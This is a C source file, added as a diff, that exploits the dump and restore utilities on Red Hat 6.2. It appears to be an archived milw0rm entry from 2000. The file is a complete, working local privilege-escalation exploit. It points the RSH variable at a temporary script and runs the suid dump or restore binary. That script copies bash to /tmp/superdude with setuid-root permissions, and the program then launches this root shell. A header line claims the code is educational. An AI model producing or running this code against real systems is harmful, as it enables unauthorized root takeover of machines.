@@ -1,0 +1,122 @@
+/*
+**
+**  dump-0.4b15x.c
+**
+**  dump-0.4b15 exploit:
+**  Redhat 6.2 dump command executes
+**  external program with suid priviledge.
+**
+**  affected:
+**     /sbin/dump
+**     /sbin/dump.static
+**     /sbin/restore
+**     /sbin/restore.static
+**
+**  Bug found by mat@hacksware.com
+**
+**  This example was coded by md0claes@mdstud.chalmers.se
+**  It was written for EDUCATIONAL PURPOSES ONLY.
+**
+**
+*/
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define RUNME     "/tmp/runme"      	/* tmp file		   */
+#define SUID_PATH "/tmp/superdude"		/* the power of root */
+
+void usage(char *pname)
+{
+ fprintf(stdout, "\nUsage: %s < d | s | r | p >\n\n", pname);
+ fprintf(stdout,   "  d - exploit /sbin/dump\n");
+ fprintf(stdout,   "  s - exploit /sbin/dump.static\n");
+ fprintf(stdout,   "  r - exploit /sbin/restore\n");
+ fprintf(stdout,   "  p - exploit /sbin/restore.static\n\n");
+}
+
+int main(int argc, char *argv[], char *envp[])
+{
+ int fd;
+ pid_t pid;
+ char *bad_env[] = { "TAPE=garbage:garbage", "RSH="RUNME };
+ char   runbuf[] = { "#!/bin/sh\n/bin/cp /bin/bash "
+                    SUID_PATH "\nchmod 6755 " SUID_PATH };
+
+ char *suid[] = { SUID_PATH, NULL };
+ char   *av[] = { "/sbin/restore.static", "restore.static",
+                  "-t", "/tmp/foo" };
+
+ if (argc != 2) {
+  usage(argv[0]);
+  exit(1);
+ }
+
+ switch(tolower(argv[1][0])) {
+
+  case 'd':
+   av[0] = "/sbin/dump";
+   av[1] = "dump";
+   av[2] = "-0";
+   av[3] = "/";
+   break;
+
+  case 's':
+   av[0] = "/sbin/dump.static";
+   av[1] = "dump.static";
+   av[2] = "-0";
+   av[3] = "/";
+   break;
+
+  case 'r':
+   av[0] = "/sbin/restore";
+   av[1] = "restore";
+   break;
+
+  case 'p':
+   break;
+
+  default:
+   usage(argv[0]);
+   exit(1);
+ }
+
+ if ((fd = open(RUNME,O_WRONLY|O_CREAT|O_TRUNC, 0755)) == -1) {
+  perror("fopen");
+  exit(1);
+ }
+
+ if (write(fd, runbuf, sizeof(runbuf)) == -1) {
+  perror("write");
+  exit(1);
+ }
+ close(fd);
+
+ if ((pid = fork()) < 0) {
+  perror("fork");
+  exit(1);
+ }
+
+ else if (pid == 0) {
+  if (execle(av[0], av[1], av[2], av[3], NULL, bad_env) < 0) {
+   perror("execle");
+   _exit(1);
+  }
+ }
+
+ sleep(1);
+ unlink(RUNME);
+ fprintf(stdout, "\nExploited %s \n", av[0]);
+ fprintf(stdout, "Running " SUID_PATH "\n");
+ execve(SUID_PATH, suid, envp);
+
+ exit(0);
+}
+
+
+// milw0rm.com [2000-11-29]
